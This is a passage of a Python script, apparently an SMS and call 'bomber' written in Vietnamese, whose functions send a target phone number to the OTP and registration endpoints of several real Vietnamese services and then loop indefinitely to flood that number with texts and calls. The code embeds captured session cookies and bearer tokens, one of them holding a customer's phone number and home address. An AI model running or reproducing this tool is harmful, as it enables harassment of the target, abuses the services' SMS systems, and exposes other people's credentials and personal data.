        'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x',
    }

    response = requests.post('https://www.nhaphang247.com/site/get-code', cookies=cookies, headers=headers, data=data)
def sms40(phone):
  headers = {
    'Host': 'ubofood.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '54',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://ubofood.com',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://ubofood.com/register',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; _ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; _ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
    }
  data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt',phone)
  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text
def sms41(phone):
    global thanhcong
    global thatbai
    headers = {
        "Host": "api8.viettelpay.vn",
        "product": "VIETTELPAY",
        "accept-language": "vi",
        "authority-party": "APP",
        "channel": "APP",
        "type-os": "android",
        "app-version": "5.1.4",
        "os-version": "10",
        "imei": "VTP_" + generate_random_string(32),
        "x-request-id": "20230803164512",  # Replace with the current date and time in the format "YmdHis"
        "content-type": "application/json; charset=UTF-8",
        "user-agent": "okhttp/4.2.2"
    }

    data = {
        "type": "msisdn",
        "username": phone
    }

    response = requests.post("https://api8.viettelpay.vn/customer/v1/validate/account", json=data, headers=headers, verify=False)
    get_data = response.json()

    if get_data["status"]["code"] == "CS9901":
        data = {
            "hash": "",
            "identityType": "msisdn",
            "identityValue": phone,
            "imei": "VTP_" + generate_random_string(32),
            "notifyToken": "",
            "otp": "android",
            "pin": "VTP_" + generate_random_string(32),
            "transactionId": "",
            "type": "REGISTER",
            "typeOs": "android",
            "verifyMethod": "sms"
        }
        response = requests.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=data, headers=headers, verify=False)
        get_data = response.json()
    else:
        data = {
            "imei": "VTP_" + generate_random_string(32),
            "loginType": "BASIC",
            "msisdn": phone,
            "otp": "",
            "pin": "VTP_" + generate_random_string(32),
            "requestId": "",
            "typeOs": "android",
            "userType": "msisdn",
            "username": phone
        }
        response = requests.post("https://api8.viettelpay.vn/auth/v1/authn/login", json=data, headers=headers, verify=False)
        get_data = response.json()

    if "Cần xác thực bổ sung OTP" in get_data["status"]["message"] or "Vui lòng nhập mã OTP được gửi về SĐT " + phone + " để xác minh chính chủ" in get_data["status"]["message"]:
        thanhcong+=1
    else:
        thatbai+=1
def sms42(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_cfuvid': 'lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000',
        'con.ses.id': 'cb51616e-d90e-4d43-afff-4a8d4090aaea',
        'cf_clearance': 'JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900',
        '_gid': 'GA1.3.455334370.1693616897',
        '_gat_gtag_UA_3729099_6': '1',
        '_gat_UA-3729099-1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'ECEDsVw9uB_ZcsJoOLvv1Y0mgh3',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_1708983': '0',
        '_hjSession_1708983': 'eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D',
        '_gcl_au': '1.1.716350485.1693616908',
        'desapp': 'sellernet01',
        'SERVERID': '53',
        '_ga': 'GA1.3.177629587.1693616897',
        '_hjSessionUser_1708983': 'eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==',
        '__zi': '2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D',
        '_ga_HTS298453C': 'GS1.1.1693616898.1.1.1693616926.32.0.0',
    }

    headers = {
        'authority': 'm.batdongsan.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        # 'cookie': '_cfuvid=lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000; con.ses.id=cb51616e-d90e-4d43-afff-4a8d4090aaea; cf_clearance=JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900; _gid=GA1.3.455334370.1693616897; _gat_gtag_UA_3729099_6=1; _gat_UA-3729099-1=1; _tt_enable_cookie=1; _ttp=ECEDsVw9uB_ZcsJoOLvv1Y0mgh3; _hjFirstSeen=1; _hjIncludedInSessionSample_1708983=0; _hjSession_1708983=eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D; _gcl_au=1.1.716350485.1693616908; desapp=sellernet01; SERVERID=53; _ga=GA1.3.177629587.1693616897; _hjSessionUser_1708983=eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==; __zi=2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D; _ga_HTS298453C=GS1.1.1693616898.1.1.1693616926.32.0.0',
        'dnt': '1',
        'referer': 'https://m.batdongsan.com.vn/sellernet/trang-dang-ky',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get(
        'https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params,
        cookies=cookies,
        headers=headers,
    )

    thanhcong+=1
def sms43(phone):
    global thanhcong
    global thatbai
    headers = {
        "Host": "id.icankid.vn",
        "Connection": "keep-alive",
        "Content-Length": "134",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://id.icankid.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://id.icankid.vn/auth",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "_ga_LM3PQNHV6S=GS1.1.1683042907.1.0.1683042907.60.0.0; _gcl_au=1.1.888294803.1683042909; _ga_JLL9R732MK=GS1.1.1683042909.1.0.1683042909.0.0.0; _ga_FMXKZXNRJB=GS1.1.1683042909.1.0.1683042909.60.0.0; _hjSessionUser_3154488=eyJpZCI6IjFlZDBjZjEzLTk1NTYtNWFiYi1hNjZkLWVhYzZhMmJkYTljZCIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5NDYsImV4cCI6ZmFsc2V9; _hjFirstSeen=1; _hjIncludedInSessionSample_3154488=0; _hjSession_3154488=eyJpZCI6IjJlZmFjYjk2LWQ4NWEtNGY3NC1iYjdiLWEyMjRmNDQ5YzQ3YiIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5ODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _gid=GA1.2.665729834.1683042910; _gat_gtag_UA_201462250_4=1; _gat_UA-222516876-1=1; _fbp=fb.1.1683042910188.410123624; _ga_T14T78MGX8=GS1.1.1683042910.1.0.1683042910.0.0.0; _ga=GA1.1.820789589.1683042908; _ga_5KHZV6MD4J=GS1.1.1683042915.1.0.1683042916.0.0.0; _ga=GA1.3.820789589.1683042908; _gid=GA1.3.665729834.1683042910; _gat_UA-213798897-3=1"
    }
    
    data = {
        "phone": phone,
        "challenge_code": "674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00",
        "challenge_method": "SHA256"
    }
    response = requests.post("https://id.icankid.vn/api/otp/challenge/", json=data, headers=headers)
    
    if response.ok:
        thanhcong+=1
    else:
        thatbai+=1
def sms44(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"cocailondjtcmm12@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def run(phone):
    print(format_print("VIP","ĐANG SPAM TIN NHẮN"))
    sms0(phone)
    sms1(phone)
    sms2(phone)
    sms3(phone)
    sms4(phone)
    sms5(phone)
    sms7(phone)
    sms8(phone)
    sms9(phone)
    sms10(phone)
    sms11(phone)
    sms12(phone)
    sms13(phone)
    sms14(phone)
    sms15(phone)
    sms17(phone)
    sms18(phone)
    sms19(phone)
    sms20(phone)
    sms21(phone)
    sms22(phone)
    sms23(phone)
    sms24(phone)
    sms25(phone)
    sms26(phone)
    sms27(phone)
    sms28(phone)
    sms29(phone)
    sms30(phone)
    sms31(phone)
    sms32(phone)
    sms33(phone)
    sms34(phone)
    sms35(phone)
    sms36(phone)
    sms37(phone)
    sms5(phone)
    sms7(phone)
    sms8(phone)
    sms9(phone)
    sms10(phone)
    sms11(phone)
    sms12(phone)
    sms38(phone)
    sms39(phone)
    sms40(phone)
    sms41(phone)
    sms42(phone)
    sms43(phone)
    sms44(phone)
    print(format_print("VIP","ĐANG SPAM CALL"))
    time.sleep(1)
    call2(phone)
    time.sleep(5)
    call6(phone)
    time.sleep(5)
    call3(phone)
    time.sleep(5)
    call4(phone)
    time.sleep(5)
    call5(phone)
    time.sleep(5)
    time.sleep(1)
    call2(phone)
    time.sleep(5)
    call6(phone)
    time.sleep(5)
    call3(phone)
    time.sleep(5)
    call4(phone)
    time.sleep(5)
    call5(phone)
    time.sleep(5)
banner()
def chay():
                  global phone
                  phone=input('Nhập Số Điện Thoại:')
                  while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",phone):
                      print('sdt dưới 10 số à ')
                  run(phone)
chay()
hoang=0
while hoang==0:
                                    run(phone)

        
